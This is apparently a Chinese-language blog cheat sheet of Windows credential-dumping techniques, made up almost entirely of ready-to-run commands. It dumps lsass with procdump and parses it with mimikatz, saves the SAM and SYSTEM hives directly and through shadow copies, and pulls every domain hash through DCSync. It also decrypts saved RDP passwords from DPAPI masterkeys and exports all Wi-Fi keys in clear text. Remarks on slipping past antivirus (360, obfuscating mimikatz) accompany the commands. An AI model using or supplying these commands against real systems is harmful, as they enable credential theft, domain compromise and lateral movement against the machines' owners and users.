凭证导出

2022-06-11

记录一些Windows凭证导出tips

0x1 离线导出Hash

前提条件是都需要管理员的方式

0x1.1 procdump

procdump64.exe  -accepteula  -ma lsass.exe C:\Users\lsass.dmp

# 自带压缩软件压缩一下
makecab c:\jboss\bin\1.dmp  1.zip


# mimikatz解析
mimikatz.exe "log log.txt" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit

0x1.2 reg

大概率会被360发现

reg save HKLM\SAM C:\Users\SamBkup.hiv
reg save HKLM\SYSTEM C:\Users\SystemBkup.hiv 

# mimikatz 解析
mimikatz.exe "lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv" exit

0x1.3 影卷复制

vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.save
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.save

0x2 在线导出Hash/密码

0x2.1 在线导出本地hash/密码

主要是dump lsass进程，mimikatz需要免杀处理

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full"

0x2.2 网络导出域控所有hash

需要有dcsync的权限，可以通过ldap的acl搜索

mimikatz # lsadump::dcsync /domain:test.com /all /csv

0x3. rdp相关

# 查看本地连接过哪些rdp
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s

# 查看保存在本地的远程主机信息
cmdkey /list

解密RDP

# 查看本地是否存在RDP密码文件
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
#解析
mimikatz # privilege::debug
mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\A5FA65905EC73425374412F3A66BF4F3

# 如果是离线的解密，加载事先dump下来的lsass，如果没有使用procdump重新dump即可
# 如果是CS或者本机器则可以省略本步骤(# procdump64.exe -accepteula -ma lsass.exe lsass.dmp)
mimikatz #sekurlsa::minidump lsass.dmp

# 根据guidMasterKey找到对应的Masterkey
mimikatz # sekurlsa::dpapi

# 通过Masterkey解密出明文RDP连接密码。
mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\A5FA65905EC73425374412F3A66BF4F3 /masterkey:1df6b7a86b7aa3238c6899b1b4fd7b4ccba852db9b2ea611bbb7943f34b788f55d27835591ccde1e6c643d9aca724fd495282f5fc92ee80746262d8759b9d23d

0x4 Wifi

# 查wifi名称
netsh wlan show profile 

# 导出wifi密码
netsh wlan show profile ChinaNet-4GDLZ8 key=clear

# 导出所有wifi密码
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
